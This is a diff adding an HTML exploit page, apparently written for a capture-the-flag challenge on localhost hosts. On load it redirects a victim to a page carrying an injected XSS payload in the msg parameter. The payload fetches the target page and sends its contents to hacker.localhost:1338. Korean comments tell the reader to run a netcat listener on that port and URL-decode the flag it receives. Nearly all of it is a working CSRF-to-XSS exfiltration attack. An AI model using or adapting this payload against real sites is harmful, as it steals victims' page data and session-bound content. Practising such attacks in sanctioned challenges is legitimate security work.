@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF-to-XSS Exploit</title>
+</head>
+<body>
+    <h1>Welcome to the Exploit Page</h1>
+    <p>If you see this page, the exploit has already been triggered!</p>
+
+    <script>
+        // Immediately redirect victim to the ephemeral page with the injected payload in the msg parameter
+        window.location.href = `http://challenge.localhost/ephemeral?msg=<img src="x" onerror="fetch('http://challenge.localhost/').then(response => response.text()).then(data => { fetch(\`http://hacker.localhost:1338/?response=\${encodeURIComponent(data)}\`); });">`;
+    </script>
+</body>
+</html>
+
+//터미널 하나 더띄우던가 해서 nc -lvp 1338로 위 xss결과 받을준비 해두셈.
+//이후 응답받은 플래그는 url decoder로 돌리면 됨.
